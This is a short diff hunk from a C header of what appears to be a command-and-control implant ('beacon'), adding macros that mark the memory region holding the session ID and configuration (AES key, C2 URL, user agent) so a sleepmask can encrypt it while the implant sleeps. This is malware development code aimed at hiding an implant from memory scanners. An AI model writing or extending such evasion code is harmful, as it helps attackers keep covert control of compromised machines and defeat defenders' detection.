@@ -523,6 +523,14 @@ typedef struct {
 
 /* ========= [ beacon instance ] ========= */
 
+/* W0.7: the private region the sleepmask masks at night - SessionId + Config
+ * (AES key, C2 URL, profile, UA, header names) sit back-to-back right after
+ * Magic.  Magic stays VISIBLE: the TEB retrieval macro validates it on every
+ * wake.  Nothing may read [base, base+len) while the beacon sleeps; the
+ * sleepmask reads only its own NAX_SM_INFO (struct offset far past Config). */
+#define NAX_PRIV_BASE( Nax )    ( (PBYTE)(Nax)->SessionId )
+#define NAX_PRIV_LEN( Nax )     ( (UINT32)( (ULONG_PTR)&(Nax)->Config + sizeof( (Nax)->Config ) - (ULONG_PTR)&(Nax)->SessionId ) )
+
 #define NAX_HTTP_STALE_MS  60000u  /* close persistent handles when sleep > this */
 #define NAX_INSTANCE_MAGIC 0x4E615843u  /* "NaXC" */
 
